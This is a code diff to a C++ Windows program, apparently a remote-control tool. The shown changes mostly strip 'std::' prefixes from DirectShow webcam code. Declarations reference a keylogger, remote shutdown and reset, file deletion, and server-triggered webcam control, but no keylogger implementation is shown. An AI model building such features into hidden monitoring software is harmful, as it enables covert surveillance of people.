@@ -4,8 +4,8 @@
 #include "Header.h"
 
 
-void ShutdownSystem();
-void ResetSystem();
+int ShutdownSystem();
+int ResetSystem();
 string TranslateKey(int key, bool capsLock, bool shiftPressed, bool winPressed);
 void Keylogger(bool& isTurnOn, bool& appOn);
 bool DeleteFile(const string& filepath);
@@ -45,17 +45,17 @@ struct WebcamController {
 
     bool startWebcam() {
         if (pControl) {
-            std::cout << "Webcam is already running.\n";
+            cout << "Webcam is already running.\n";
             return false;
         }
 
         if (FAILED(CoInitialize(nullptr))) {
-            std::cerr << "Failed to initialize COM.\n";
+            cerr << "Failed to initialize COM.\n";
             return false;
         }
 
         if (FAILED(CoCreateInstance(CLSID_FilterGraph, nullptr, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&pGraph))) {
-            std::cerr << "Failed to create GraphBuilder.\n";
+            cerr << "Failed to create GraphBuilder.\n";
             CoUninitialize();
             return false;
         }
@@ -64,7 +64,7 @@ struct WebcamController {
         IEnumMoniker* pEnum = nullptr;
         if (FAILED(CoCreateInstance(CLSID_SystemDeviceEnum, nullptr, CLSCTX_INPROC_SERVER, IID_ICreateDevEnum, (void**)&pDevEnum)) ||
             FAILED(pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0)) || !pEnum) {
-            std::cerr << "No webcam found.\n";
+            cerr << "No webcam found.\n";
             releaseResources();
             return false;
         }
@@ -78,13 +78,13 @@ struct WebcamController {
         pDevEnum->Release();
 
         if (!pCaptureFilter) {
-            std::cerr << "Failed to bind webcam.\n";
+            cerr << "Failed to bind webcam.\n";
             releaseResources();
             return false;
         }
 
         if (FAILED(pGraph->AddFilter(pCaptureFilter, L"Video Capture"))) {
-            std::cerr << "Failed to add webcam filter to graph.\n";
+            cerr << "Failed to add webcam filter to graph.\n";
             releaseResources();
             return false;
         }
@@ -93,7 +93,7 @@ struct WebcamController {
         if (FAILED(CoCreateInstance(CLSID_CaptureGraphBuilder2, nullptr, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**)&pCaptureGraphBuilder)) ||
             FAILED(pCaptureGraphBuilder->SetFiltergraph(pGraph)) ||
             FAILED(pCaptureGraphBuilder->RenderStream(&PIN_CATEGORY_PREVIEW, &MEDIATYPE_Video, pCaptureFilter, nullptr, nullptr))) {
-            std::cerr << "Failed to render stream.\n";
+            cerr << "Failed to render stream.\n";
             pCaptureGraphBuilder->Release();
             releaseResources();
             return false;
@@ -102,7 +102,7 @@ struct WebcamController {
 
         if (FAILED(pGraph->QueryInterface(IID_IMediaControl, (void**)&pControl)) ||
             FAILED(pGraph->QueryInterface(IID_IVideoWindow, (void**)&pVideoWindow))) {
-            std::cerr << "Failed to query Media Control or Video Window.\n";
+            cerr << "Failed to query Media Control or Video Window.\n";
             releaseResources();
             return false;
         }
@@ -112,23 +112,23 @@ struct WebcamController {
         pVideoWindow->put_Visible(OATRUE);
 
         if (FAILED(pControl->Run())) {
-            std::cerr << "Failed to start the graph.\n";
+            cerr << "Failed to start the graph.\n";
             releaseResources();
             return false;
         }
 
-        std::cout << "Webcam started.\n";
+        cout << "Webcam started.\n";
         return true;
     }
 
     void stopWebcam() {
         if (!pControl) {
-            std::cout << "Webcam is not running.\n";
+            cout << "Webcam is not running.\n";
             return;
         }
 
         releaseResources();
-        std::cout << "Webcam stopped.\n";
+        cout << "Webcam stopped.\n";
     }
 };
 void Webcam(bool& isWebcamOn, bool& isServerOn);
